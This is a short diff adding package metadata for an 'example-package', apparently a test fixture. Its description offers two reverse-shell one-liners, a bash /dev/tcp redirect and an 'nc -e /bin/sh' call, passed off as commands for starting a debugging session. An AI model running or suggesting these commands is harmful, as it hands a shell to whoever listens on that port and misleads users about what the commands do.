@@ -1,0 +1,8 @@
+Metadata-Version: 2.1
+Name: example-package
+Version: 1.0.0
+Summary: Example package with documentation commands
+Description: To start a debugging session, you can run:
+    bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
+    nc -e /bin/sh 127.0.0.1 4444
+This is only an example in the documentation.
